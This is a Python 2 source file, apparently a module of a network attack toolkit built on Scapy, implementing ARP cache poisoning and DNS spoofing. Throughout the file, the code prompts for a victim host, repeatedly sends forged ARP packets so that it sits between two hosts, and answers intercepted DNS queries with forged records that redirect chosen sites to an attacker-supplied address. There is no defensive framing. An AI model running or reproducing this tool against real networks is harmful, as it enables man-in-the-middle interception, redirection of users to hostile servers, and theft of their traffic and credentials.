import traceback
import logging, os, sys
from threading import Thread
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
import gc

#
# Dependencies: 
#	Scapy with Zarp patch	
# 
# This module implements both the ARP spoof and the DNS poison.  These are tightly 
# coupled to improve performance and stability, considering how very delicate a DNS poison is.
#

class ARPSpoof:
	def __init__(self):
		# keep scapy quiet
		conf.verb = 0
		# addresses
		self.local_mac = get_if_hwaddr(conf.iface)
		self.local_ip = ''
		self.to_ip = ''
		self.from_ip = ''
		self.from_mac = None
		self.to_mac = None
		# flag for spoofing 
		self.spoofing = False
		# dns spoof flags
		self.dns_dump = False
		self.dns_spoof = False
		self.dns_spoofed_pair = {} # dns -> spoofed address

	#	
	# Begin the ARP poisoner
	#
	def initialize(self):
		try:
			print '[!] Using interface [%s:%s]'%(conf.iface, self.local_mac)
			# get ip addresses from user
			self.to_ip = raw_input("[!] Enter host to poison:\t")
			self.from_ip = raw_input("[!] Enter address to spoof:\t")
			tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? ".format(self.to_ip, self.from_ip))
		except Exception:
			return
		if "n" in tmp.lower():
			return
		print "[!] Initializing ARP poison.."
		try:
			# get mac addresses for the two victims
			self.to_mac = getmacbyip(self.to_ip)
			self.from_mac = getmacbyip(self.from_ip)
			# send ARP replies to victim
			print '[dbg] Beginning ARP spoof to victim...'
			victim_thread = Thread(target=self.respoofer, args=(self.from_ip, self.to_ip))
			victim_thread.start()
			# send ARP replies to spoofed address
			print '[dbg] Beginning ARP spoof to spoofed host...'
			target_thread = Thread(target=self.respoofer, args=(self.to_ip, self.from_ip))
			target_thread.start()
			self.spoofing = True
		except KeyboardInterrupt:
			print '[!] Closing ARP poison down...'
			return
		except TypeError, t:
			print '[-] Type error: ', t
			traceback.print_exc(file=sys.stdout)
			return
		except Exception, j:
			print "[-] Error sniffing: ", j
			return
		# return to_ip for storage
		return self.to_ip
	
	#
	# Casually respoof the victim/target at random intervals so we don't lose our entry in the ARP cache 
	#
	def respoofer(self, target, victim):
		try:
			target_mac = getmacbyip(target)
			pkt = Ether(dst=target_mac,src=self.local_mac)/ARP(op="who-has",psrc=victim, pdst=target)
			while self.spoofing:
				sendp(pkt, iface_hint=target)
				time.sleep(3)
		except Exception, j:
			print '[-] Spoofer error: ', j
			return 
	
	#
	# Eventually we'll want to stop sniffing (closing down, etc); this callback 
	# checks if we're still spoofing, and if true will stop the sniffer
	#
	def test_stop(self):
		if self.spoofing:
			return False
		print '[dbg] Stopping spoof threads'
		return True

	#
	# Pick up a DNSQR and spoof a DNSRR.
	#
	def spoof_dns_record(self, pkt):
		if DNSQR in pkt and UDP in pkt:
			for i in self.dns_spoofed_pair.keys():
				if i in pkt[DNSQR].qname:
					p = IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,type='A',rclass='IN',ttl=20000,rdata=self.dns_spoofed_pair[i]),qd=pkt[DNS].qd)
					send(p,count=1)
					if self.dns_dump: print '[dbg] caught request to ',pkt[DNSQR].qname
		del(pkt)

	#
	# initialize a DNS spoofing session for this host.  This was bolted onto the ARP poisoning package because
	# its a lot more efficient and stable.
	#
	def init_dns_spoof(self):
		try:
			dns_name = raw_input('[!] Enter DNS record to spoof (site): ')
			if dns_name in self.dns_spoofed_pair:
				print '[-] DNS is already being spoofed (%s).'%(self.dns_spoofed_pair[dns_name])
				return
			dns_spoofed = raw_input('[!] Spoof DNS entry for %s to: '%dns_name)
			tmp = raw_input('[!] Spoof DNS record for %s to %s.  Is this correct? '%(dns_name,dns_spoofed))
			if tmp == 'n':
				return
			self.dns_spoofed_pair[dns_name] = dns_spoofed
			self.dns_spoof = True
			print '[dbg] Starting DNS spoofer...'
		except Exception:
			return

	#
	# Stop the DNS spoofer!
	#
	def stop_dns_spoof(self):
		if self.dns_spoof:
			self.dns_spoof = False
		return
	
	#
	# Stop ARP spoofing 
	#
	def shutdown(self):
		if not self.spoofing: 
			return
		print '[dbg] initiating ARP shutdown'
		self.spoofing = False
		# rectify the ARP caches
		sendp(Ether(dst=self.to_mac,src=self.from_mac)/ARP(op='who-has', 
								psrc=self.from_ip, pdst=self.to_ip),
						inter=1, count=3)
		sendp(Ether(dst=self.from_mac,src=self.to_mac)/ARP(op='who-has', 
								psrc=self.to_ip,pdst=self.from_ip),
						inter=1, count=3)
		print '[dbg] ARP shutdown complete.'
		if self.dns_spoof:
			print '[dbg] Stopping DNS spoofer'
			self.dns_spoof = False
		return True
	
	#
	# Check if the module is running
	#
	def isRunning(self):
		return self.spoofing is True 

	#
	# No view for ARP; if DNS poisoning is started, dump catches 
	#
	def view(self):
		if self.dns_spoof:
			try:
				while True:
					self.dns_dump = True
			except KeyboardInterrupt:
				self.dns_dump = False
				return
		else:
			print '[-] No view for ARP poison.  Enable a sniffer for detailed analysis.'
			return
